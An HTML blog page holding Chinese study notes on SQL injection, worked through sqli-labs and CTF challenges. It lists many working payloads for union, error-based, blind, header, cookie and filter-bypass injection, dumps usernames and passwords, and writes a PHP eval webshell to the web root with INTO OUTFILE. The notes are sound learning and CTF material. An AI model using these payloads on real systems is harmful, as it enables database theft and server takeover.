@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SQL injection 对SQL注入的一些常见payload和不同类型注入的总结 基础无过滤注入union联合注入 这种注入需要有回显位，使用联合注入union select，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用order by语句或者直接尝试来探取行数进行回显。 使用group_concat聚合函数将查询结果一次性输出，提高效率。 以sqli-lab的less1为例，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL injection">
+<meta property="og:url" content="https://blog.z3ratu1.cn/SQL%20injection.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="SQL injection 对SQL注入的一些常见payload和不同类型注入的总结 基础无过滤注入union联合注入 这种注入需要有回显位，使用联合注入union select，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用order by语句或者直接尝试来探取行数进行回显。 使用group_concat聚合函数将查询结果一次性输出，提高效率。 以sqli-lab的less1为例，">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-03-12T13:32:00.000Z">
+<meta property="article:modified_time" content="2021-07-24T14:17:20.402Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="SQLI">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/SQL%20injection.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>SQL injection | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/SQL%20injection.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL injection
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-12 21:32:00" itemprop="dateCreated datePublished" datetime="2020-03-12T21:32:00+08:00">2020-03-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-24 22:17:20" itemprop="dateModified" datetime="2021-07-24T22:17:20+08:00">2021-07-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/SQL%20injection.html" class="post-meta-item leancloud_visitors" data-flag-title="SQL injection" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/SQL%20injection.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/SQL%20injection.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><p> 对SQL注入的一些常见payload和不同类型注入的总结</p>
+<h2 id="基础无过滤注入"><a href="#基础无过滤注入" class="headerlink" title="基础无过滤注入"></a>基础无过滤注入</h2><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p> 这种注入需要有回显位，使用联合注入<code>union select</code>，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用<code>order by</code>语句或者直接尝试来探取行数进行回显。<br> 使用<code>group_concat</code>聚合函数将查询结果一次性输出，提高效率。<br> 以sqli-lab的less1为例，payload为：<br> 数据库名：<br><code>?id=-1&#39; union select 1,2,database() --+</code><br>获取全部数据库名<br><code>id=-1 union select schema_name from information_schema.schemata --+</code><br> 表名：<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br> 列名：<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code><br> 数据：<br> <code>id=-1 union select 1,2,group_concat(username,0x3a,password) from users --+</code><br> 此处<code>group_concat</code>函数中间的参数为一个字符，将username和password分割开来，便于观察</p>
+<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p> 题目利用了union联合注入，过滤了括号，绝杀，base32+base64给出提示<code>select * from user where username = &#39;$name&#39;</code><br> 过滤了括号使得绝大多数注入方式无效，测试得知有一个名为admin的用户存在，union select在该查询内容查询不到时会把输入内容作为查询结果返回，因此构造<code>name=a&#39; union select 1,&#39;admin&#39;,&#39;md5(passwd)&#39;&amp;&amp;pw=passwd</code>即可，题目提示了password的校验是通过对比MD5，所以我们以上述方式构造，返回的查询结果即为我们构造的结果，所以只要随便提交一个passwd和与其对应的md5就能成功登陆了</p>
+<h3 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h3><p> 这种类型就是会把SQL语句的错误给返回出来，那么可以通过报错信息来获得敏感数据，常用函数为<code>extractvalue</code>和<code>updatexml</code>，用concat函数将待查询语句聚合为该函数的第二个参数，由于我们查询的数据不符合Xpath语法，产生报错获取信息<br> 此时需要查询的id为真，需要预先知道一个用户名（admin）或id(1)<br> 使用格式为：<br> <code>?id=1&#39;and extractvalue(1,concat(0x7e,(查询语句) )) --+</code><br> 报错显示可能存在长度限制，使用not in语句查询剩余值<br> 同样sqli-lab中less1为例<br>多年不写SQL注入已经忘了这个函数怎么用的了。。。。concat一个0x7e，也就是<code>~</code>，能保证解析出问题然后把保存回显出来<br> payload：<code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;)))) --+</code><br>updatexml和extractvalue差不多，但是updatexml比extractvalue多一个参数，随便写个啥就行<br><code>updatexml(1,concat(0x7e,(查询语句),2))</code></p>
+<h4 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h4><p>一道二次注入加报错注入的题，题目过滤了空格和&lt;&gt;不等号，还有一些无关紧要的东西，updatexml和extractvalue可用，新奇点在于过滤了空格和不等号后，not in和不等号无法使用，而报错注入输出的错误信息长度是有限的，所以会出现获取不到有效信息的问题，这里就有两个新知识点</p>
+<p>SQL查询也支持正则匹配，使用方式为 <code>where column/table_name regexp (pattern)</code>，利用正则表达式就可以获取我们想要的内容，但是如果单条消息过长导致的输出不全，正则匹配也没有用，这时可以逆序输出，使用reverse函数即可<br>把今天用的几个payload补上来，括号数量不要输错了</p>
+<p><code>1&quot;&amp;&amp;extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;&amp;&amp;(column_name)regexp(&#39;^r&#39;))))#</code><br><code>1&quot;&amp;&amp;extractvalue(1,concat(0x7e,reverse((select(group_concat(username))from(users)where(username)regexp(&#39;^f&#39;)))))#</code></p>
+<h4 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h4><p>标准公式<code>union select 1 from (select count(),concat(floor(rand(0)*2),(注入语句))a from information_schema.tables group by a)b --+</code><br>这个方法具有一定的随机性，爆出来的数据取决于rand()函数，并且是以报错的形式显示出来。不怎么实用，原理如下<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html">https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html</a></p>
+<h3 id="盲注入"><a href="#盲注入" class="headerlink" title="盲注入"></a>盲注入</h3><p> 基于时间和bool类型的盲注入界面没有错误回显，也没有查询显示位，bool注入一般只有一个标志位确认你目前的语句是否正确<br> 时间类型的注入可能页面无任何回显，使用<code>sleep()</code>函数延迟判断结果是否正确<br> 此类注入手工注入十分麻烦，需要用一定的python基础写脚本跑比较好<br> 常用语句有<code>if length left limit</code><br> left(arg,n)取arg左边n位，用if判断<br> limit x,1 从第x位（从0开始）取1个</p>
+<h4 id="基于bool的盲注入"><a href="#基于bool的盲注入" class="headerlink" title="基于bool的盲注入"></a>基于bool的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code><br> 手工注入的时候可以不用等于号，用&gt;&lt;号加快注入速度<br> 这方面还有许多奇怪函数，待填坑</p>
+<h4 id="基于时间的盲注入"><a href="#基于时间的盲注入" class="headerlink" title="基于时间的盲注入"></a>基于时间的盲注入</h4><p> 样例payload：<br> <code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; , sleep(3), 1) --+</code><br> 多一层if语句，判断正确则调用sleep函数，页面存在明显延迟<br> 还有一个替代sleep的函数，BENCHMARK(count,expr)，执行expr count次，可以通过执行简单的语句几千次来实现延时<br> 简单讲一下if语句，if需要三个表达式，执行效果类似于C++中的 <code>a=b?a:b</code>语句</p>
+<h3 id="使用update语句的注入"><a href="#使用update语句的注入" class="headerlink" title="使用update语句的注入"></a>使用update语句的注入</h3><p> 查询语句为常为<br> <code>UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$username&#39;</code></p>
+<h4 id="update后可见被更新数据的注入"><a href="#update后可见被更新数据的注入" class="headerlink" title="update后可见被更新数据的注入"></a>update后可见被更新数据的注入</h4><p> 将passwd改为<code>&#39;,username=database() #</code>即可将所有的用户名修改为database(),如果能观察到被修改的数据，即可完成注入，update语句中的select经常会遇到一些不期待的奇怪问题，如需嵌套两层select，并需要给其加上一个别名<br> 例如：<code>(select description from(select * from users where username=0x61646d696e)a)</code> </p>
+<h4 id="有语法错误回显的注入"><a href="#有语法错误回显的注入" class="headerlink" title="有语法错误回显的注入"></a>有语法错误回显的注入</h4><p> 该类型注入通常会对username进行强过滤，需要从password进行突破。一般是基于报错进行注入，常用函数为<code>extractvalue</code>和<code>updatexml</code>,操作在最后一步爆数据时略有差异。<br>sqli-lab的less17为例：</p>
+<ul>
+<li>使用<code>extractvalue</code>函数：<code>passwd=1&#39; and extractvalue(1,concat(0x7e,(select password from users where username=&#39;admin&#39;))) --+</code></li>
+</ul>
+<p> 此时报错<code> You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code><br> 查一下之后解决方案为多加一层select，变为<code>passwd=1&#39; and extractvalue(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;))) --+</code></p>
+<p> 再次报错<code>Every derived table must have its own</code>，需要给表加一个别名<br> payload为<code>1&#39; and extractvalue(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;)as test))) --+</code><br>  此时注入就成功了。</p>
+<p>  有时还会报一个返回的数据超过一行的错误，<code>Subquery returns more than 1 row </code>只需在where子句后再加上一句limit 0,1即可解决</p>
+<ul>
+<li>使用<code>updatexml</code>函数<br> <code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ </code><br> 同样遭遇上述报错，最终payload为<code>1&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&#39;admin&#39;) test),0x7e),1) --+</code></li>
+</ul>
+<h3 id="导出文件型注入"><a href="#导出文件型注入" class="headerlink" title="导出文件型注入"></a>导出文件型注入</h3><p> 本题来源为sqli-lab的less7<br> 原理是利用SQL注入来获取getshell</p>
+<p> 这里还是先把正规做法过一遍，首先是得到文件的路径，一般来说默认路径为<code>var/www/html</code><br> 也有说不同服务器的默认路径有别，如下</p>
+<blockquote>
+<p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html， &#x2F;home&#x2F;wwwroot&#x2F;default， &#x2F;usr&#x2F;share&#x2F;nginx， &#x2F;var&#x2F;www&#x2F;htm等<br>apache 就是 …&#x2F;var&#x2F;www&#x2F;htm，…&#x2F;var&#x2F;www&#x2F;html&#x2F;htdocs<br>phpstudy 就是 …\PhpStudy20180211\PHPTutorial\WWW<br>xammp 就是 …\xampp\htdocs</p>
+</blockquote>
+<p> 这里是本地PHPstudy搭建的环境，所以payload路径如下：<br> <code>http://localhost/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&#39;a&#39;]);?&gt;&#39; into outfile &#39;D:\PHPStudy\PHPTutorial\WWW\sqli-labs-master\1.php&#39; --+ </code><br>into outfile将写入脚本（这里需要预先知道正确的物理路径才能写入），而load_file将读取文件<br>写入PHP一句话，使用中国菜刀连上即可，需要使用union select，select语句有执行功能</p>
+<p>还有一题为网鼎杯的fakebook<br>这个题的过滤不够完善，使得我们可以使用MySQL的load_file函数读取flag<br>该题报错泄露了服务器的目录，为标准的&#x2F;var&#x2F;www&#x2F;html，就可以使用load_file函数对文件进行读取，注意.php文件在读取后&lt;&gt;会被视为注释，需要查看网页源码才能看到<br>贴一个博文<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/blacksunny/p/8060028.html">https://www.cnblogs.com/blacksunny/p/8060028.html</a></p>
+<h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>这个方法需要SQL开启secure-file-priv写文件权限，否则不能写入文件。<br>可在SQL设置中将secure-file-priv参数设置为“”即可<br>如果引号中是一个文件路径的话，导入&#x2F;出的文件路径会再这个路径下。</p>
+<h3 id="基于错误的头部注入"><a href="#基于错误的头部注入" class="headerlink" title="基于错误的头部注入"></a>基于错误的头部注入</h3><p>和之前的基于错误的注入区别不是很大，关键在于注入点由id,username,password转到了user-agent，cookie或者是referer等数据包请求头，可通过burp suite抓包修改。使用上述的两个函数引发错误获取信息，或者是直接注入</p>
+<h4 id="使用insert语句的注入"><a href="#使用insert语句的注入" class="headerlink" title="使用insert语句的注入"></a>使用insert语句的注入</h4><p>sqlil-lab的less18将用户的UA插入了数据库，使用的是INSERT语句<code>INSERT INTO &#39;security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code><br>这里不好使用注释符将后面内容注释掉，所以我们使用之前提到的办法用<code>and &#39;</code>来闭合引号<br>样例payload：<br><code>User-Agent:&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</code></p>
+<h4 id="基于错误的cookie注入"><a href="#基于错误的cookie注入" class="headerlink" title="基于错误的cookie注入"></a>基于错误的cookie注入</h4><p>cookie是服务器用来辨别访问者的一段小文本，所以当我们向页面发起请求时，若cookie尚未过期，服务器即可通过cookie识别我们的身份，既然如此，就存在着服务器通过cookie查询数据的操作，我们便可通过cookie进行注入</p>
+<p>sqli-lab的less20为例<br>在后台代码存在当用户发起访问且未进行post数据（登录操作）时，及用户纯粹的再次访问网站时，进行了数据库查询。<br>所以这里要求的是!isset($_POST[‘submit’])，这个地方我困惑了好久</p>
+<p>我们在bp抓包之后不进行post数据，直接发起访问，系统就会将我们的cookie放入数据库进行查询，此时我们使用修改过的cookie进行注入<br>这里cookie接受的参数名称为uname，题目中给出了一定的提示<br>样例payload：<br><code>Cookie: uname=admin&#39; union select 1,2,database()--+</code><br>在less21提出了一个base64加密cookie的操作，唯一的功能就是–+这个注释不能用了，应该是提交的时候进行了URL编码，+被换成空格去掉了，在进行编码解码时就丢失了，要改成#进行注释</p>
+<h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>2020国赛决赛做到的一个题，一开始以为是limit注入，去学习了一波，结果并不是<br>p神博客文章<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a><br>用了一个新的语句PROCEDURE ANALYSE，这个语句是用来做数据分析的（？但是这里拿来注入）<br>analyse接受两个参数，第一个可以用来执行命令，放一个p神的payload<br><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code><br>括号套的人头晕<br>还有个新东西BENCHMARK，接受两个参数，运行次数和命令语句<br>运行n次指定的指令，运行次数够大之后就可以代替sleep进行延迟<br>比如BENCHMARK(5000000,SHA1(1))</p>
+<h3 id="整数溢出注入"><a href="#整数溢出注入" class="headerlink" title="整数溢出注入"></a>整数溢出注入</h3><p>也是bool注入的一种类型，通过最大数字+1导致整数溢出报错进行布尔判断，+1加的就是一个判断的结果true为1false为0<br>同详见RoarCTF2020wp</p>
+<h2 id="进阶有过滤注入"><a href="#进阶有过滤注入" class="headerlink" title="进阶有过滤注入"></a>进阶有过滤注入</h2><p>无过滤在找到注入点之后基本都能被SQLmap给跑出来，一切当然不会这么简单，所以这里还有各种各样的有过滤的注入，比如过滤注释符，过滤and or等关键字，过滤逗号括号空格等等<br>且该种注入也会和上述基础注入类型结合，出现过滤了注释符的盲注入之类的，很容易让人困惑</p>
+<h3 id="过滤注释符"><a href="#过滤注释符" class="headerlink" title="过滤注释符"></a>过滤注释符</h3><p>SQL注入需要用注释符注释掉后面的内容，使得我们插入的内容得以执行，当注释符被过滤时，我们可以通过再构造一个<code>and &#39;</code>来重新闭合引号，而不是使用注释符来注释引号。<br>样例payload：<br><code>?id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database() and &#39;1&#39;=&#39;1</code><br>此时经常构造<code>and &#39;1&#39;=&#39;1</code>和<code> where &#39;1&#39;=&#39;1</code>的语句，既能闭合引号，又完成了对所有数据的查询</p>
+<p>国赛碰到的题，过滤了&#x2F;**&#x2F;，但是没有过滤两个分开的内容，注入语句为<code>select * from fake_flag where id=$id limit 0, $limit</code><br>结果就是id处整一个&#x2F;*，limit处整一个*&#x2F;，把中间的部分处理掉了，太牛逼了</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入是防御者对用户输入的恶意数据进行转义防止注入，但恶意数据在存入数据库（比如注册的用户名）后又恢复为原样，导致再次从数据库中取出时产生的SQL注入sqli-lab的less24为例<br>就本题而言，注册的用户名即为进行注入的语句，update的查询语句为<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code><br>这道题的目前解为通过恶意的用户名<code>admin&#39; #</code>注释掉查询语句后半部分内容，直接修改admin的密码进行登录<br>可以尝试使用sleep等函数，使用盲注尝试暴库<br>这里有一篇关于本题写的比较好的文章<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/3fe7904683ac">https://www.jianshu.com/p/3fe7904683ac</a></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>替换方案：url编码 %20&#x3D;空格，%09&#x3D;tab %0a&#x3D;换行 %0b&#x3D;竖直tab %0c&#x3D;新的一页 %0d&#x3D;return %a0&#x3D;Linux下解析为空格，Windows下为不可见字符 皆可替换<br>&#x2F;**&#x2F;注释符代替空格<br>（）括号绕过空格，这里要注意括号括起的范围，防止查询语句出错<br>样例payload：<br><code> ?id=0&#39;union%3Aselect(1),(database()),(3)or(1)=&#39;1</code><br>这里不能将select后面的语句全部用括号括起来，而是需要每个用括号括起来之后用逗号连接</p>
+<h4 id="部分位置的空格绕过"><a href="#部分位置的空格绕过" class="headerlink" title="部分位置的空格绕过"></a>部分位置的空格绕过</h4><p>\N 似乎等价于NULL<br><code>select * from users where id=\Nunion(select 1,1,1);</code><br>浮点数也可<br><code>select * from users where id=1.1union(select 1,1,1);</code><br>运算符号<br><code>select * from users where id=1.1union(select+1,1,1);</code><br><code>select * from users where id=1.1union(select-1,1,1);</code><br>!,~等符号均可</p>
+<h4 id="补一个调了好久的payload"><a href="#补一个调了好久的payload" class="headerlink" title="补一个调了好久的payload"></a>补一个调了好久的payload</h4><p><code>select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())from(1))));</code></p>
+<p><code>(select(ascii(substr((查询语句)from(1))))=a);</code><br>顺带没用上逗号</p>
+<h3 id="bypass-infromation-schema"><a href="#bypass-infromation-schema" class="headerlink" title="bypass infromation_schema"></a>bypass infromation_schema</h3><p>常出现在对or的限制中，同时躺枪的还有order,password等语句</p>
+<h4 id="innoDB引擎绕过"><a href="#innoDB引擎绕过" class="headerlink" title="innoDB引擎绕过"></a>innoDB引擎绕过</h4><p>该库在MySQL版本大于5.6.x的情况下存在两个表innodb_index_stats，innodb_table_stats<br>数据库版本可以用@@version或者version()查看<br><code>union select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</code>获取表名<br>使用innodb_index_stats获取库名</p>
+<h4 id="sys库绕过"><a href="#sys库绕过" class="headerlink" title="sys库绕过"></a>sys库绕过</h4><p>innoDB绕过需要开启innoDB引擎，而mysql默认配置中该引擎是关闭的<br>使用sys库获取数据的话需要用户权限为root，可通过user()进行查看</p>
+<p>使用<code>sys.schema_auto_increment_columns</code>库可以获取带有自增id列的表的表名<br>使用<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>库可以获取任意表名（大概？）</p>
+<h4 id="join无列名注入"><a href="#join无列名注入" class="headerlink" title="join无列名注入"></a>join无列名注入</h4><p>先记一下payload<br>获取第一个列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b)c</code><br>获取后续列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b using(id,username))c--+</code></p>
